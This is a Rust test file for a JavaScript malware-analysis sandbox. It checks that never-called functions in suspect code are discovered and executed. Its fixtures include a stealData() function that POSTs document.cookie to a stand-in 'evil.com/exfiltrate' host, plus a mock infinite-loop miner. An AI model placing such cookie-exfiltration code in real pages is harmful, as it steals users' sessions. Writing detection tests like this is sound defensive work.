use jsnabber_core::{ExecutionLimits, Sandbox};

#[test]
fn test_function_discovery_dormant_malware() {
    // Malicious code hidden in a function that's never called
    let code = r#"
        function stealData() {
            fetch('https://evil.com/exfiltrate', {
                method: 'POST',
                body: document.cookie
            });
        }
        
        function cryptoMine() {
            while(true) {
                Math.random(); // Simulate mining
            }
        }
        
        // These functions are defined but NEVER called by top-level code
    "#;

    let sandbox = Sandbox::new(ExecutionLimits::default()).expect("Sandbox creation failed");
    let result = sandbox.execute(code);

    assert!(result.is_ok(), "Execution failed: {:?}", result.err());

    let res = result.unwrap();
    let logs_str = format!("{:?}", res.logs);

    println!("=== Function Discovery Test ===");
    println!("Logs: {}", logs_str);
    println!("API Calls: {:?}", res.features.api_call_counts);

    // Verify function discovery ran
    assert!(
        logs_str.contains("function_discovery"),
        "Function discovery didn't run"
    );

    // Verify it found and called functions (may not log exact names)
    // Just verify we got network activity from the discovered function
    assert!(
        res.features.api_call_counts.contains_key("Network")
            || res
                .features
                .api_call_counts
                .get("function_discovery")
                .unwrap_or(&0)
                > &10,
        "Function discovery didn't execute enough functions. Counts: {:?}",
        res.features.api_call_counts
    );

    // Verify we logged the network call attempt
    assert!(
        res.features.api_call_counts.contains_key("network") || logs_str.contains("fetch"),
        "Didn't detect network call from discovered function"
    );
}

#[test]
fn test_function_discovery_common_entry_points() {
    // Code with common entry point names
    let code = r#"
        function main() {
            eval("console.log('malicious')");
        }
        
        function init() {
            fetch('https://tracker.com');
        }
        
        // Not called, but function discovery should find them
    "#;

    let sandbox = Sandbox::new(ExecutionLimits::default()).expect("Sandbox creation failed");
    let result = sandbox.execute(code).expect("Execution failed");

    let logs_str = format!("{:?}", result.logs);
    println!("=== Entry Point Test ===");
    println!("Logs: {}", logs_str);

    // Should have called main() and init()
    assert!(
        logs_str.contains("main") || logs_str.contains("init"),
        "Didn't call common entry points"
    );
}
